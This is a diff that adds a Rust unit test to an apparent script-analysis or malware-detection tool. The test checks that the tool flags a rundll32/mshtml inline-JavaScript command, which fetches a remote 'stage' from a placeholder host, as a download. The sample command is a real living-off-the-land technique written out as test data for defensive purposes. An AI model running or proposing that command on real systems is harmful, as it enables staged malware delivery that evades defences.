@@ -8207,6 +8207,23 @@ mod misc_handler_tests {
     }
 
     #[test]
+    fn rundll32_mshtml_inline_javascript_url_is_scanned() {
+        let script = br#"rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";fetch("https://rundll32-mshtml-js.example/stage")"#;
+        let report = crate::analyze(script, &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://rundll32-mshtml-js.example/stage"
+                )
+            }),
+            "rundll32 mshtml inline JavaScript URL was not scanned: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn rundll32_quoted_downloaded_dll_with_spaces_resolves_url() {
         let mut env = Environment::new(&Config::default());
         env.modified_filesystem.insert(
